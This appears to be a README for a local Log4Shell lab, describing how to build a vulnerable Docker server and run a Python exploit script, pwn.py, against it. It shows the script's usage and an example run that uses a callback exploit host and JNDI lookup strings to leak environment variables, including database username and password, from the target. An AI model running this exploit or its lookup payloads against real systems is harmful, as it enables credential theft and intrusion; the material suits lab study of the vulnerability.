## build and create docker image

use `docker` to build an image with `docker build -t log4jpwn .`

## run

The server will log 3 things (which are also the triggers). You don't have to set all 3:

- The `User-Agent` header content
- The request path
- The `pwn` query string parameter

To use:

- Run the container with `docker run --rm -p 3737:8080 log4jpwn`

```

## run - exploit

The python exploit will leak values. By default it will try `${java:version}`, but you can specify anything with the `--leak` flag.

Usage is:

```text
❯ ./pwn.py --help
usage: pwn.py [-h] --target TARGET [--listen-host LISTEN_HOST] [--listen-port LISTEN_PORT] --exploit-host EXPLOIT_HOST [--leak LEAK]



optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        target uri
  --listen-host LISTEN_HOST
                        exploit server host to listen on (default: 127.0.0.1)
  --listen-port LISTEN_PORT, -lp LISTEN_PORT
                        exploit server port to listen on (default: 8888)
  --exploit-host EXPLOIT_HOST, -eh EXPLOIT_HOST
                        host where (this) exploit server is reachable
  --leak LEAK, -l LEAK  value to leak.  (default: ${java:version})
```

Example runs:

- `sudo ./pwn.py --target http://localhost:3737/adem?pwn=kose --exploit-host 172.18.0.1 --leak '${env:PWN}_:;_${env:DB_USERNAME}_:;_${env:DB_PASSWORD}_:;_${java:os}_:;_${sys:java.version}'`
